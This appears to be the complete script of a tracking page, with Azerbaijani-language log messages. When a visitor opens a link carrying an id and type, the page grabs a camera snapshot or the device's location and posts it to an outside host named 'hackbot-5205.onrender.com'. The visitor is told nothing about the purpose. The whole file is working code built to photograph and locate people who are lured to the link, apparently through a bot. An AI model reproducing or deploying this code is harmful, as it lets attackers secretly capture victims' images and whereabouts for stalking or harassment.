    <script>
        async function getMedia(unique_id, api_url) {
            try {
                console.log("Kamera icaz…ôsi ist…ônilir...", { unique_id, api_url });
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        console.log("Video y√ºkl…ôndi, √∂l√ß√ºl…ôr:", video.videoWidth, video.videoHeight);
                        resolve();
                    };
                });

                video.play();
                await new Promise((resolve) => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                const imageDataUrl = canvas.toDataURL('image/jpeg');
                console.log("√á…ôkil…ôn ≈ü…ôkil (ilk 50 simvol):", imageDataUrl.substring(0, 50) + "...");

                canvas.toBlob(blob => {
                    console.log("≈û…ôkil √ß…ôkildi, API-y…ô g√∂nd…ôrilir...", { blobSize: blob.size });
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('unique_id', unique_id);
                    fetch(api_url + '/upload', {
                        method: 'POST',
                        body: formData
                    }).then(response => {
                        console.log('≈û…ôkil g√∂nd…ôrildi:', response.status, response.statusText);
                        return response.text();
                    }).catch(error => {
                        console.error('≈û…ôkil g√∂nd…ôrilm…ô x…ôtasƒ±:', error);
                    });
                }, 'image/jpeg', 0.9);
            } catch (err) {
                console.error("Kamera x…ôtasƒ±:", err);
            }
        }

        function getLocation(unique_id, api_url) {
            if (navigator.geolocation) {
                console.log("Yer icaz…ôsi ist…ônilir...");
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log("Yer m…ôlumatƒ± alƒ±ndƒ±:", lat, lon);
                    fetch(api_url + '/upload_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({unique_id: unique_id, latitude: lat, longitude: lon})
                    }).then(response => {
                        console.log('Yer g√∂nd…ôrildi:', response.status, response.statusText);
                        return response.text();
                    }).catch(error => {
                        console.error('Yer g√∂nd…ôrilm…ô x…ôtasƒ±:', error);
                    });
                }, err => {
                    console.error("Yer x…ôtasƒ±:", err);
                });
            } else {
                console.error("Brauzer geolocation-u d…ôst…ôkl…ômir");
            }
        }

        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const unique_id = urlParams.get('id');
            const type = urlParams.get('type');
            const api_url = 'https://hackbot-5205.onrender.com';

            console.log("Link parametrl…ôri:", { unique_id, type, api_url });

            if (!unique_id || !type) {
                document.body.innerHTML = '<h1>Ke√ß…ôrsiz link!</h1>';
                console.error("Ke√ß…ôrsiz link: unique_id v…ô ya type yoxdur");
                return;
            }

            if (type === 'camera') {
                getMedia(unique_id, api_url);
            } else if (type === 'location') {
                getLocation(unique_id, api_url);
            }
        };
    </script>
